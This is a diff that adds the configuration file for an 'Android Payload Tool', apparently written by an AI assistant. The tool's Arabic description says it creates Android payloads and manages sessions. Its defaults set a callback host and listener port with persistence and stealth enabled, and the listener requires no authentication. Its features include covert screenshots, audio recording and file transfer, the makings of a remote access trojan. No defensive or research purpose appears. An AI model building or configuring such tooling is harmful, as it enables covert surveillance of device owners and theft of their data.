@@ -1,0 +1,68 @@
+{
+  "app": {
+    "name": "Android Payload Tool",
+    "version": "1.0.0",
+    "description": "أداة متقدمة لإنشاء بايلودات الأندرويد وإدارة الجلسات",
+    "author": "AI Assistant",
+    "language": "ar"
+  },
+  "defaults": {
+    "payload": {
+      "name": "android_payload",
+      "lhost": "192.168.1.100",
+      "lport": 4444,
+      "encryption": true,
+      "persistence": true,
+      "stealth": true
+    },
+    "listener": {
+      "host": "0.0.0.0",
+      "port": 4444,
+      "timeout": 30,
+      "max_connections": 10
+    },
+    "encryption": {
+      "algorithm": "AES-256",
+      "key_size": 256,
+      "hash_algorithm": "SHA-256",
+      "iterations": 100000
+    }
+  },
+  "paths": {
+    "output": "output",
+    "sessions": "sessions",
+    "keys": "keys",
+    "logs": "logs",
+    "templates": "templates",
+    "backups": "backups"
+  },
+  "logging": {
+    "level": "INFO",
+    "max_file_size": "10MB",
+    "backup_count": 5,
+    "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+  },
+  "security": {
+    "require_authentication": false,
+    "session_timeout": 3600,
+    "max_failed_attempts": 3,
+    "lockout_duration": 300
+  },
+  "gui": {
+    "theme": "dark",
+    "window_size": "1200x800",
+    "min_window_size": "800x600",
+    "auto_save": true,
+    "auto_refresh": 5000
+  },
+  "features": {
+    "payload_generation": true,
+    "listener_server": true,
+    "session_management": true,
+    "encryption": true,
+    "gui_interface": true,
+    "file_transfer": true,
+    "screenshot": true,
+    "audio_recording": true
+  }
+}
